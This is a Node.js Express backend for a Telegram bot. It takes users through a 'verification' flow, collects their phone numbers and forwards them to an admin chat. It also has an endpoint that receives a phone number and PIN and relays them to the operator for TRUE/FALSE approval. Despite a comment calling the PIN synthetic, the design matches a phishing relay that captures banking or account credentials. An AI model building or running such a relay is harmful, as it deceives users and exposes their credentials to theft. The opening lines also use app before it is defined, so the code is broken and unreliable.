
const cors = require("cors");

app.use(cors());
app.use(express.json());require("dotenv").config();

const express = require("express");

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 10000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const BACKEND_URL = process.env.BACKEND_URL;

if (!BOT_TOKEN) {
    console.error("❌ TELEGRAM_BOT_TOKEN is missing.");
    process.exit(1);
}

if (!ADMIN_CHAT_ID) {
    console.warn("⚠️ TELEGRAM_ADMIN_CHAT_ID is missing.");
}

const TELEGRAM_API =
    `https://api.telegram.org/bot${BOT_TOKEN}`;

// ==========================================
// TELEGRAM API
// ==========================================

async function telegram(method, data = {}) {

    try {

        const response = await fetch(
            `${TELEGRAM_API}/${method}`,
            {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            }
        );

        const result = await response.json();

        if (!result.ok) {
            console.error("Telegram error:", result);
        }

        return result;

    } catch (error) {

        console.error(
            "Telegram request failed:",
            error
        );

        return null;
    }
}

// ==========================================
// SEND MESSAGE
// ==========================================

async function sendMessage(
    chatId,
    text,
    options = {}
) {

    if (!chatId) {
        console.error("❌ Chat ID is missing.");
        return null;
    }

    return telegram(
        "sendMessage",
        {
            chat_id: chatId,
            text,
            parse_mode: "HTML",
            ...options
        }
    );
}

// ==========================================
// ADMIN MESSAGE
// ==========================================

async function notifyAdmin(text, options = {}) {

    if (!ADMIN_CHAT_ID) {
        console.log(
            "⚠️ TELEGRAM_ADMIN_CHAT_ID is not configured."
        );

        return null;
    }

    return sendMessage(
        ADMIN_CHAT_ID,
        text,
        options
    );
}

// ==========================================
// START
// ==========================================

async function handleStart(message) {

    const chatId =
        message.chat.id;

    const firstName =
        message.from?.first_name || "User";

    const username =
        message.from?.username
            ? `@${message.from.username}`
            : "No username";

    await sendMessage(
        chatId,

        `👋 <b>Welcome, ${firstName}</b>\n\n` +
        `Your Telegram account has been connected successfully.\n\n` +
        `Please choose an option below:`,

        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "📱 Share Phone Number",
                            callback_data: "share_phone"
                        }
                    ],
                    [
                        {
                            text: "✅ Start Verification",
                            callback_data:
                                "start_verification"
                        }
                    ]
                ]
            }
        }
    );

    await notifyAdmin(
        `🔔 <b>NEW TELEGRAM USER</b>\n\n` +
        `Name: ${firstName}\n` +
        `Username: ${username}\n` +
        `Telegram ID: <code>${chatId}</code>`
    );
}

// ==========================================
// START VERIFICATION
// ==========================================

async function startVerification(chatId) {

    await sendMessage(
        chatId,

        `🔐 <b>Verification Required</b>\n\n` +
        `Please confirm that you want to continue ` +
        `with the verification process.`,

        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ True",
                            callback_data:
                                "verification_true"
                        },
                        {
                            text: "❌ False",
                            callback_data:
                                "verification_false"
                        }
                    ]
                ]
            }
        }
    );
}

// ==========================================
// CALLBACKS
// ==========================================

async function handleCallback(callback) {

    if (!callback.message) {
        return;
    }

    const chatId =
        callback.message.chat.id;

    const data =
        callback.data;

    await telegram(
        "answerCallbackQuery",
        {
            callback_query_id: callback.id
        }
    );

    // --------------------------------------
    // SHARE PHONE
    // --------------------------------------

    if (data === "share_phone") {

        await sendMessage(
            chatId,

            `📱 <b>Phone Number</b>\n\n` +
            `Tap the button below to share your ` +
            `phone number with this bot.`,

            {
                reply_markup: {
                    keyboard: [
                        [
                            {
                                text:
                                    "📱 Share My Phone Number",
                                request_contact: true
                            }
                        ]
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            }
        );

        return;
    }

    // --------------------------------------
    // START VERIFICATION
    // --------------------------------------

    if (data === "start_verification") {

        await startVerification(chatId);

        return;
    }

    // --------------------------------------
    // TRUE
    // --------------------------------------

    if (data === "verification_true") {

        await sendMessage(
            chatId,

            `✅ <b>Verification Confirmed</b>\n\n` +
            `Your confirmation has been recorded.`
        );

        await notifyAdmin(
            `✅ <b>VERIFICATION CONFIRMED</b>\n\n` +
            `Telegram ID: <code>${chatId}</code>`
        );

        return;
    }

    // --------------------------------------
    // FALSE
    // --------------------------------------

    if (data === "verification_false") {

        await sendMessage(
            chatId,

            `❌ <b>Verification Cancelled</b>\n\n` +
            `No verification was completed.`
        );

        await notifyAdmin(
            `❌ <b>VERIFICATION CANCELLED</b>\n\n` +
            `Telegram ID: <code>${chatId}</code>`
        );

        return;
    }
}

// ==========================================
// PHONE CONTACT
// ==========================================

async function handleContact(message) {

    const chatId =
        message.chat.id;

    const contact =
        message.contact;

    if (!contact) {
        return;
    }

    const phone =
        contact.phone_number;

    const firstName =
        contact.first_name || "Unknown";

    await sendMessage(
        chatId,

        `✅ <b>Phone Number Received</b>\n\n` +
        `Name: ${firstName}\n` +
        `Phone: ${phone}\n\n` +
        `You can now continue.`,

        {
            reply_markup: {
                remove_keyboard: true
            }
        }
    );

    await notifyAdmin(
        `📱 <b>PHONE NUMBER SHARED</b>\n\n` +
        `Name: ${firstName}\n` +
        `Phone: <code>${phone}</code>\n` +
        `Telegram ID: <code>${chatId}</code>`
    );
}

// ==========================================
// TEST VERIFICATION
// ==========================================
//
// This route is restricted to synthetic test
// values. It is not intended for real banking
// credentials.
// ==========================================

app.post(
    "/demo-verification",
    async (req, res) => {

        const {
            phone,
            demoPin
        } = req.body;

        if (!phone || !demoPin) {

            return res.status(400).json({
                success: false,
                message:
                    "Phone and demo PIN are required."
            });
        }

        const message =
            `🔔 <b>TEST VERIFICATION REQUEST</b>\n\n` +
            `Phone: <code>${phone}</code>\n` +
            `Test PIN: <code>${demoPin}</code>\n\n` +
            `<b>Confirm test request:</b>`;

        const result =
            await notifyAdmin(
                message,
                {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "✅ TRUE",
                                    callback_data:
                                        "test_true"
                                },
                                {
                                    text: "❌ FALSE",
                                    callback_data:
                                        "test_false"
                                }
                            ]
                        ]
                    }
                }
            );

        if (!result?.ok) {

            return res.status(500).json({
                success: false,
                message:
                    "Unable to send test request to Telegram."
            });
        }

        return res.json({
            success: true,
            message:
                "Test verification request sent."
        });
    }
);

// ==========================================
// TEST TRUE / FALSE
// ==========================================

async function handleTestDecision(
    callback,
    approved
) {

    const chatId =
        callback.message.chat.id;

    await telegram(
        "answerCallbackQuery",
        {
            callback_query_id: callback.id,
            text: approved
                ? "TRUE selected"
                : "FALSE selected"
        }
    );

    if (approved) {

        await sendMessage(
            chatId,

            `✅ <b>TEST VERIFICATION APPROVED</b>\n\n` +
            `The synthetic verification request ` +
            `was marked TRUE.`
        );

    } else {

        await sendMessage(
            chatId,

            `❌ <b>TEST VERIFICATION REJECTED</b>\n\n` +
            `The synthetic verification request ` +
            `was marked FALSE.`
        );
    }
}

// ==========================================
// TELEGRAM WEBHOOK
// ==========================================

app.post(
    "/telegram/webhook",
    async (req, res) => {

        try {

            const update =
                req.body;

            if (update.message) {

                const message =
                    update.message;

                if (
                    message.text === "/start"
                ) {

                    await handleStart(
                        message
                    );

                } else if (
                    message.contact
                ) {

                    await handleContact(
                        message
                    );
                }
            }

            if (update.callback_query) {

                const callback =
                    update.callback_query;

                if (
                    callback.data ===
                    "test_true"
                ) {

                    await handleTestDecision(
                        callback,
                        true
                    );

                } else if (
                    callback.data ===
                    "test_false"
                ) {

                    await handleTestDecision(
                        callback,
                        false
                    );

                } else {

                    await handleCallback(
                        callback
                    );
                }
            }

            res.sendStatus(200);

        } catch (error) {

            console.error(
                "Webhook error:",
                error
            );

            res.sendStatus(500);
        }
    }
);

// ==========================================
// HEALTH CHECK
// ==========================================

app.get("/", (req, res) => {

    res.json({

        success: true,

        message:
            "Telegram Bot Backend is running",

        status: "online"

    });
});

// ==========================================
// SET WEBHOOK
// ==========================================

app.get(
    "/set-webhook",
    async (req, res) => {

        if (!BACKEND_URL) {

            return res.status(400).json({

                success: false,

                message:
                    "BACKEND_URL is missing."

            });
        }

        const webhookUrl =
            `${BACKEND_URL.replace(/\/$/, "")}` +
            `/telegram/webhook`;

        const result =
            await telegram(
                "setWebhook",
                {
                    url: webhookUrl
                }
            );

        res.json({

            success:
                result?.ok === true,

            webhook:
                webhookUrl,

            telegram:
                result

        });
    }
);

// ==========================================
// WEBHOOK INFO
// ==========================================

app.get(
    "/webhook-info",
    async (req, res) => {

        const result =
            await telegram(
                "getWebhookInfo"
            );

        res.json(result);
    }
);

// ==========================================
// BOT INFO
// ==========================================

app.get(
    "/bot-info",
    async (req, res) => {

        const result =
            await telegram(
                "getMe"
            );

        res.json(result);
    }
);

// ==========================================
// SERVER
// ==========================================

app.listen(
    PORT,
    () => {

        console.log(
            `🚀 Telegram Bot Backend ` +
            `running on port ${PORT}`
        );

    }
);
